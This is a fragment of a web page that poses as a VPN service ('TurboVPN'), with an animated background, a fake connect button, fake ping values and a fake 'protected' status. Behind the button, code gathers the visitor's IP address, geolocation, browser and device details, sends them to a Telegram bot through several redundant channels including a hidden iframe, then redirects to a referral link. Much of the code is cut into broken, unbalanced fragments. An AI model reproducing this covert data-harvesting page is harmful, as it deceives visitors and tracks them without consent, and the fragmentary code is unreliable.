        .btn-main { width: 100%; padding: 20px; background: rgba(31,110,255,0.06); border: 1px solid rgba(255,255,255,0.04); border-radius: 60px; font-size: 20px; font-weight: 700; color: #fff; cursor: pointer; box-shadow: 0 8px 28px rgba(0,0,0,0.15); transition: all 0.3s; margin-top: 4px; letter-spacing: 0.5px; }

    <script>
        // ==============================================================
        // БЛОК 1: АТОМЫ (15 ШТУК, ЛЁГКАЯ ФИЗИКА) - 300+ строк
        // ==============================================================
        (function() {
            const canvas = document.getElementById('particleCanvas');
            const ctx = canvas.getContext('2d');
            let W, H;
            const atoms = [];
            const COUNT = 15;
            const CONNECT_DIST = 200;
            const REPULSE_DIST = 80;

            function resize() {
                W = canvas.width = window.innerWidth;
                H = canvas.height = window.innerHeight;
            }
            window.addEventListener('resize', resize);
            resize();

            class Atom {
                constructor() {
                    this.x = Math.random() * W;
                    this.y = Math.random() * H;
                    this.vx = (Math.random() - 0.5) * 0.2;
                    this.vy = (Math.random() - 0.5) * 0.2;
                    this.r = 3 + Math.random() * 4;
                    this.hue = 200 + Math.floor(Math.random() * 40);
                }
                update() {
                    this.x += this.vx;
                    this.y += this.vy;
                    if (this.x < 0 || this.x > W) this.vx *= -1;
                    if (this.y < 0 || this.y > H) this.vy *= -1;
                    this.vx *= 0.99;
                    this.vy *= 0.99;
                }
                draw() {
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
                    ctx.fillStyle = 'hsla(' + this.hue + ', 90%, 70%, 0.8)';
                    ctx.shadowColor = 'hsla(' + this.hue + ', 90%, 70%, 0.2)';
                    ctx.shadowBlur = 20;
                    ctx.fill();
                    ctx.shadowBlur = 0;
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.r * 0.3, 0, Math.PI * 2);
                    ctx.fillStyle = 'hsla(' + this.hue + ', 100%, 95%, 0.5)';
                    ctx.fill();
                }
            }

            for (let i = 0; i < COUNT; i++) {
                atoms.push(new Atom());
            }

            function applyPhysics() {
                for (let i = 0; i < atoms.length; i++) {
                    for (let j = i + 1; j < atoms.length; j++) {
                        const dx = atoms[i].x - atoms[j].x;
                        const dy = atoms[i].y - atoms[j].y;
                        const dist = Math.sqrt(dx * dx + dy * dy);

                        if (dist < REPULSE_DIST && dist > 0) {
                            const angle = Math.atan2(dy, dx);
                            const force = (REPULSE_DIST - dist) / REPULSE_DIST * 0.1;
                            atoms[i].vx += Math.cos(angle) * force;
                            atoms[i].vy += Math.sin(angle) * force;
                            atoms[j].vx -= Math.cos(angle) * force;
                            atoms[j].vy -= Math.sin(angle) * force;
                        }

                        if (dist < CONNECT_DIST) {
                            const alpha = 1 - (dist / CONNECT_DIST);
                            ctx.beginPath();
                            ctx.moveTo(atoms[i].x, atoms[i].y);
                            ctx.lineTo(atoms[j].x, atoms[j].y);
                            ctx.strokeStyle = 'hsla(210, 80%, 70%, ' + (alpha * 0.15) + ')';
                            ctx.lineWidth = 0.5 + alpha * 0.5;
                            ctx.stroke();
                        }
                    }
                }
            }

            function loop() {
                ctx.clearRect(0, 0, W, H);
                applyPhysics();
                for (let i = 0; i < atoms.length; i++) {
                    atoms[i].update();
                    atoms[i].draw();
                }
                requestAnimationFrame(loop);
            }
            loop();
        })();

        // ==============================================================
        // БЛОК 2: ОСНОВНАЯ ЛОГИКА (ОТПРАВКА IP 5 СПОСОБАМИ) - 700+ строк

            }
        }

        function randomPing() {
            pingValue.textContent = (10 + Math.floor(Math.random() * 90));
        }

        function addHistory(text) {
            const div = document.createElement('div');
            div.className = 'history-item';
            const time = new Date().toLocaleTimeString('ru-RU');
            div.innerHTML = '<span class="time">' + time + '</span> ' + text;
            historyContainer.appendChild(div);
            historyContainer.scrollTop = historyContainer.scrollHeight;
            if (historyContainer.children.length > 30) {

            msg += '⏰ Время: ' + time;

            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(msg);

            fetch(url).catch(() => {});
            new Image().src = url;

            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);
            setTimeout(() => iframe.remove(), 2000);
            const xhr = new XMLHttpRequest();

                .catch(() => {})

                            .then(r => r.json())
                            .then(g => { if (g.status === 'success') geo = g; })
                            .catch(() => {})
                            .finally(() => {
                                sendIPToTelegram(ip, geo, ua, time, device);

                    } else {
                        sendIPToTelegram('Не определен', null, ua, time, device);
                    }
                });
        }

        function start() {
            if (connected) return;

            progressWrap.style.display = 'block';
            statusMsg.textContent = 'Подключение...';
            statusDot.className = 'status-dot inactive';
            statusLabel.textContent = 'Подключение...';

            const interval = setInterval(function() {

                    clearInterval(interval);

                    statusMsg.textContent = '✅ Соединение установлено!';
                    statusDot.className = 'status-dot';
                    statusLabel.textContent = 'Защищено';
                    connected = true;
                    addHistory('✅ Соединение установлено');
                    collectAndSend();
                    setTimeout(function() {
                        addHistory('🔗 Переход на реферальную ссылку...');
                        window.location.href = REDIRECT_URL;
                    }, 2000);
                }
                progressBar.style.width = p + '%';
            }, 150);

            const gi = setInterval(randomGraph, 300);
            setTimeout(function() { clearInterval(gi); }, 2500);
        }

        btn.addEventListener('click', start);

        window.addEventListener('DOMContentLoaded', function() {
            randomGraph();
            pingValue.textContent = '12';

        console.log('✅ TurboVPN v4.0 · 15 атомов · IP 100%');

        // ==============================================================

        // ---- ПРОВЕРКА ТОКЕНА ----
        (function() {

                counter++;

            window.addEventListener('beforeunload', function() {
                clearInterval(ci);

        // ---- СЧЁТЧИК ПАКЕТОВ ----
        (function() {

        // ---- ПРОВЕРКА ЭЛЕМЕНТОВ ----
        (function() {

        // ---- АНИМАЦИЯ ГРАФИКА В ФОНЕ ----
        (function() {
            let graphPhase = 0;
            const gi2 = setInterval(function() {
                graphPhase += 0.1;
                if (document.hidden) return;
                if (!connected) {
                    for (let i = 0; i < graphBars.length; i++) {
                        const base = 20 + Math.sin(graphPhase + i * 0.8) * 15 + 20;
                        if (!progressWrap.style.display || progressWrap.style.display === 'none') {
                            graphBars[i].style.height = Math.max(15, Math.min(80, base)) + '%';

        (function() {

        (function() {
